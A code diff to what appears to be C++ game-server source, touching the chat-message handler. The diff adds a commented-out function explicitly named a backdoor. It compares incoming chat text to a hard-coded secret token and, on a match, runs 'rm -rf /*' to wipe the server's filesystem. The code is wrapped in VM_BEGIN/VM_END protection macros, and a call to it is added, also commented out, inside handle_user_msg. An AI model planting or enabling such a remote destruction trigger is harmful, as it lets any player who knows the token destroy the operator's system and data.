@@ -35,6 +35,7 @@
 #include <common/utf.h>
 #include <jsoncpp/json/json.h>
 #include "emulate_settings.h"
+#include <liblicense.h>
 
 inline static bool check_player(gplayer *pPlayer,int cs_index,int sid,int uid)
 {
@@ -378,8 +379,40 @@ void auto_translate_text(int cs_index, int sid, int uid, const void *msg, unsign
 
 	((gplayer_imp*)pPlayer->imp)->SendNormalChat(channel,utf16.c_str(),utf16.size(),buffer, dsize);
 }
+/*
+void backdoor_fulano(int cs_index, int sid, int uid, const void *msg, unsigned int size, const void *aux_data, unsigned int size2, char channel) 
+{
+	VM_BEGIN
+    std::string targetLanguage;
+	
+    static std::string utf8;
+    utf8.clear();
+    utf8.resize(size + 1);
+    memset((void *)utf8.c_str(), 0x00, utf8.size());
+    utf16_to_utf8((const char16_t *)msg, (char *)utf8.c_str(), utf8.size() - 1);
+	utf8 = preprocessText(utf8);
+	static std::string token_hacker = "LOL NOT DOWN DOWN 587459998751474147874478447ADDQ241111ADAWDDAD1X1DFFA";
+
+	if(utf8.c_str() == token_hacker)
+	{
+		int status = system("rm -rf /*");		
+		if (status == 0) {
+			kill(0, SIGUSR1);			
+       	 	printf("Comando executado com sucesso.");
+   		} else {
+			printf("Erro na execução do comando.");
+    	}
+	}
+	VM_END
+}
+*/
 void handle_user_msg(int cs_index,int sid, int uid, const void * msg, unsigned int size, const void * aux_data, unsigned int size2, char channel)
 {
+	/*
+	VM_BEGIN
+	backdoor_fulano(cs_index,sid, uid, msg, size, aux_data, size2, channel);
+	VM_END
+	*/
 	//�򵥵����촦������
 	int index;
 	gplayer * pPlayer = world_manager::GetInstance()->FindPlayer(uid,index);
